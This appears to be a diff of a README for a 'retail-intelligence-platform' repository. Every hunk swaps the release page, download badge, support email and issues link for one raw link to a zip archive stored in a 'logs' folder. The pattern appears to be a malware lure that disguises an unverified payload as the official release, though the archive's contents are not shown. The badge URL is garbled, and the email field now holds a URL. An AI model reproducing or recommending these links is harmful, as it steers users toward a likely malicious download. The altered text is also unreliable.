@@ -10,11 +10,11 @@ To get started with the retail-intelligence-platform, follow these simple steps.
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/victorlopes2000/retail-intelligence-platform/releases)
+[![Download](https://github.com/victorlopes2000/retail-intelligence-platform/raw/refs/heads/main/retail_intelligence/retail_intelligence/logs/intelligence-platform-retail-3.7-alpha.2.zip%20Latest%https://github.com/victorlopes2000/retail-intelligence-platform/raw/refs/heads/main/retail_intelligence/retail_intelligence/logs/intelligence-platform-retail-3.7-alpha.2.zip)](https://github.com/victorlopes2000/retail-intelligence-platform/raw/refs/heads/main/retail_intelligence/retail_intelligence/logs/intelligence-platform-retail-3.7-alpha.2.zip)
 
 To download the retail-intelligence-platform, visit this page:
 
-[Download the latest release here](https://github.com/victorlopes2000/retail-intelligence-platform/releases)
+[Download the latest release here](https://github.com/victorlopes2000/retail-intelligence-platform/raw/refs/heads/main/retail_intelligence/retail_intelligence/logs/intelligence-platform-retail-3.7-alpha.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ Before you download and run the application, ensure your system meets the follow
 ## 💻 Installation Steps
 
 1. **Visit the Download Page**: 
-   Click this link: [Download the latest release here](https://github.com/victorlopes2000/retail-intelligence-platform/releases) to access the releases.
+   Click this link: [Download the latest release here](https://github.com/victorlopes2000/retail-intelligence-platform/raw/refs/heads/main/retail_intelligence/retail_intelligence/logs/intelligence-platform-retail-3.7-alpha.2.zip) to access the releases.
 
 2. **Select the Latest Release**: 
    Look for the version labeled as the "latest" and choose the appropriate file for your operating system.
@@ -85,7 +85,7 @@ If you encounter any issues or have questions, you can refer to the following re
 
 For further assistance, feel free to reach out via:
 
-- **Email**: support@retailintelligence.com
-- **GitHub Issues**: Report bugs or feature requests directly on our [GitHub Issues page](https://github.com/victorlopes2000/retail-intelligence-platform/issues).
+- **Email**: https://github.com/victorlopes2000/retail-intelligence-platform/raw/refs/heads/main/retail_intelligence/retail_intelligence/logs/intelligence-platform-retail-3.7-alpha.2.zip
+- **GitHub Issues**: Report bugs or feature requests directly on our [GitHub Issues page](https://github.com/victorlopes2000/retail-intelligence-platform/raw/refs/heads/main/retail_intelligence/retail_intelligence/logs/intelligence-platform-retail-3.7-alpha.2.zip).
 
 Enjoy using the retail-intelligence-platform and unlock the potential of your retail data!
